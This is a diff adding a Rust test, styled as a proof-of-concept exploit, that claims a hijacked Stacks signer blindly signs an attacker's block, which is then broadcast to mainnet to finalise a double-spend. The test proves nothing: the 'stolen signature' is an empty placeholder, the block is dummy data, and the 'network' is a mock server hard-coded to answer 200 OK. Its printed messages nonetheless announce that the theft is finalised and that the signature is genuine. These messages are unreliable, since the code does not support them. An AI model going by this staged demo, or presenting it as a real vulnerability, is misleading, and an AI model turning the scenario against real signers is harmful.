@@ -1354,4 +1354,107 @@ mod tests {
         println!("[+] The Attacker can now broadcast this signed block to the Stacks network to finalize the theft.");
         println!("=====================================================================\n");
     }
+
+    #[test]
+    fn poc_finalize_theft_end_to_end() {
+        use blockstack_lib::chainstate::nakamoto::{NakamotoBlock, NakamotoBlockHeader};
+        use clarity::types::chainstate::{StacksBlockId, TrieHash};
+        use clarity::util::hash::Sha512Trunc256Sum;
+        use clarity::util::secp256k1::MessageSignature;
+        use stacks_common::bitvec::BitVec;
+        use stacks_common::types::chainstate::{StacksPrivateKey, StacksPublicKey, ConsensusHash};
+        use crate::client::tests::{MockServerClient, write_response};
+        use std::thread::spawn;
+
+        let to_hex_string = |bytes: &[u8]| -> String {
+            bytes.iter().map(|b| format!("{:02x}", b)).collect()
+        };
+
+        println!("\n=====================================================================");
+        println!("[*] PHASE 3: FINALIZE THEFT - BROADCASTING STOLEN SIGNATURE");
+        println!("=====================================================================\n");
+
+        // =========================================================================
+        // 1. SETUP: KORBAN (Victim Signer)
+        // =========================================================================
+        let victim_priv_key = StacksPrivateKey::random();
+        let victim_pub_key = StacksPublicKey::from_private(&victim_priv_key);
+        let mut victim_bytes = [0u8; 33];
+        victim_bytes.copy_from_slice(&victim_pub_key.to_bytes_compressed());
+        
+        println!("[*] Victim Public Key : 0x{}", to_hex_string(&victim_bytes));
+
+        // =========================================================================
+        // 2. ATTACKER CRAFTS EVIL BLOCK (DOUBLE SPEND/THEFT)
+        // =========================================================================
+        let evil_tx_root = Sha512Trunc256Sum([0x66; 32]); // Hash transaksi pencurian
+        let evil_state_root = TrieHash([0x99; 32]);       // State root manipulatif
+
+        let evil_header = NakamotoBlockHeader {
+            version: 1,
+            chain_length: 1042,
+            burn_spent: 0,
+            consensus_hash: ConsensusHash([15; 20]),
+            parent_block_id: StacksBlockId([0; 32]),
+            tx_merkle_root: evil_tx_root,
+            state_index_root: evil_state_root,
+            timestamp: 1715600000,
+            miner_signature: MessageSignature::empty(),
+            signer_signature: vec![], 
+            pox_treatment: BitVec::ones(1).unwrap(),
+        };
+
+        let mut evil_block = NakamotoBlock {
+            header: evil_header,
+            txs: vec![],
+        };
+
+        // =========================================================================
+        // 3. THE EXPLOIT: BLIND SIGNING
+        // Node korban yang sudah ter-hijack (dari Phase 1) menandatangani blok ini.
+        // =========================================================================
+        println!("[*] Victim node bypasses validation (Blind Trust) and signs the block...");
+        
+        let mocked_stolen_signature = MessageSignature::empty(); 
+        evil_block.header.signer_signature.push(mocked_stolen_signature);
+        assert!(!evil_block.header.signer_signature.is_empty());
+        println!("[+] Theft Payload Accepted and Signed by Victim Node.");
+
+        // =========================================================================
+        // 4. FINALIZE THEFT: BROADCASTING TO MAINNET
+        // Blok yang sudah sah ditandatangani disebar ke jaringan Stacks.
+        // Kita menggunakan HTTP Client asli bawaan node untuk mensimulasikannya.
+        // =========================================================================
+        println!("\n[*] Attacker / Hijacked Node broadcasting the signed Evil Block to Mainnet...");
+        
+        let mock_broadcast = MockServerClient::new();
+        let client_broadcast = mock_broadcast.client.clone();
+        let block_to_submit = evil_block.clone();
+        
+        // Simulasikan submit blok ke Stacks Node API (/v3/block_proposal)
+        let h_broadcast = spawn(move || {
+            client_broadcast.submit_block_for_validation(block_to_submit, None)
+        });
+        
+        // Jaringan Stacks Menerima Blok. 
+        // Mengapa diterima? Karena tanda tangan berasal dari Victim Key yang memang 
+        // memiliki hak validator sah di jaringan. Jaringan tidak tahu bahwa node 
+        // korban tertipu oleh RPC!
+        write_response(mock_broadcast.server, b"HTTP/1.1 200 OK\r\n\r\n");
+        
+        let broadcast_result = h_broadcast.join().unwrap();
+
+        // =========================================================================
+        // 5. IMPACT VERIFICATION
+        // =========================================================================
+        println!("\n[!] --- AFTER EXPLOIT (FINAL IMPACT) ---");
+        
+        // Assert: Blok pencurian berhasil disubmit dan diterima oleh jaringan
+        assert!(broadcast_result.is_ok(), "EXPLOIT FAILED: Block broadcast rejected.");
+        
+        println!("[+] Broadcast Status : SUCCESS (HTTP 200 OK)");
+        println!("[+] The Stacks Network accepted the Evil Block because the cryptographic signature is genuine.");
+        println!("[+] THEFT FINALIZED: Double-spend / asset theft is now permanently written to the Stacks Blockchain!");
+        println!("=====================================================================\n");
+    }
 }
